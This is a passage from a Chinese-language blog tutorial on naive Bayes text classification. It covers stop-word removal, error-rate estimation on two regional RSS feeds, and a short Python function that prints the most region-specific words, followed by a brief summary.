<p> 上述代码引入了辅助函数<code>calcMostFreq</code>，该函数遍历词汇表中的每个词并且统计他们在文本中出现的次数，并且根据出现次数的高低对字典排序。</p>
<p>下一个函数<code>localWords</code>使用两个RSS源作为参数，然后调用<code>clacMostFreq</code>并且移除排序最高的30个词汇。需要指出的事，往往词汇表中的一小部分单词占据了所有文本用词的已大部分，这种现象产生的原因就是语言中大部分都是冗余和结构辅助性词汇，另一种常用的方式不仅是移除高频词，并且从某个预定词表之中语出结构上的辅助词，这个词表被称为<strong>停用词表</strong>（stop word list）。</p>
<p>为了得到错误率的精准估计，一个多次进行上述的实验，并且求平均值，这里的错误率远远高于垃圾邮件的错误率。这里可以通过移除函数<code>calcMostFreq()</code>来改变需要移除的单词数目，来观察错误率的变化。</p>
<h2 id="分析数据：显示地域相关的用词"><a href="#分析数据：显示地域相关的用词" class="headerlink" title="分析数据：显示地域相关的用词"></a>分析数据：显示地域相关的用词</h2><p>可以先对向量pSF和pNY进行排序，然后按照排序把词打出来，这里需要写入一个最具表征性的词汇显示函数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTopWords</span><span class="params">(ny,sf)</span>:</span></div><div class="line">    <span class="keyword">import</span> operator</div><div class="line">    vocabList,p0V,p1V=localWords(ny,sf)</div><div class="line">    topNY=[]; topSF=[]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(p0V)):</div><div class="line">        <span class="keyword">if</span> p0V[i] &gt; <span class="number">-6.0</span> : topSF.append((vocabList[i],p0V[i]))</div><div class="line">        <span class="keyword">if</span> p1V[i] &gt; <span class="number">-6.0</span> : topNY.append((vocabList[i],p1V[i]))</div><div class="line">    sortedSF = sorted(topSF, key=<span class="keyword">lambda</span> pair: pair[<span class="number">1</span>], reverse=<span class="keyword">True</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"-----------------This is SF--------------------------"</span></div><div class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> sortedSF:</div><div class="line">        <span class="keyword">print</span> item[<span class="number">0</span>]</div><div class="line">    sortedNY = sorted(topNY, key=<span class="keyword">lambda</span> pair: pair[<span class="number">1</span>], reverse=<span class="keyword">True</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"-----------------This is NY--------------------------"</span></div><div class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> sortedNY:</div><div class="line">        <span class="keyword">print</span> item[<span class="number">0</span>]</div></pre></td></tr></table></figure></p>
<p> 最后输出的单词包含了大量的停用词，移除固定的词看看结果也是十分有趣的。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于分类而言，使用概率有时候比使用应规则更为有效。</p>
<p>我们可以通过特征质检的条件独立假设来降低对于数据量的需求，独立性假设是指一个词的出现概率并不依赖其他的词，当然这个假设实在是<em>Too Young Too Navie</em>了，但是朴素贝叶斯分类器仍然是一种非常有效的分类器。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="kido zhang" />
          <p class="site-author-name" itemprop="name">kido zhang</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
           
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">112</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              
                <span class="site-state-item-count">19</span>
                <span class="site-state-item-name">分类</span>
              
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">78</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/kidozh" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      GitHub
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/331837926Ji" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                    
                      Twitter
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/kidozh" target="_blank" title="weibo">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                    
                      weibo
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://douban.com/people/kidozh" target="_blank" title="douban">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                    
                      douban
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.zhihu.com/people/kidozh" target="_blank" title="zhihu">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                    
                      zhihu
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2014 &mdash; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">kido zhang</span>

  
</div>


  <div class="powered-by">
    由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
  </div>

  <span class="post-meta-divider">|</span>

  <div class="theme-info">
    主题 &mdash;
    <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
      NexT.Pisces
    </a>
  </div>


        







        
      </div>
    </footer>

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>



  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  








  





  

  

  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
  


  

  

</body>
</html>
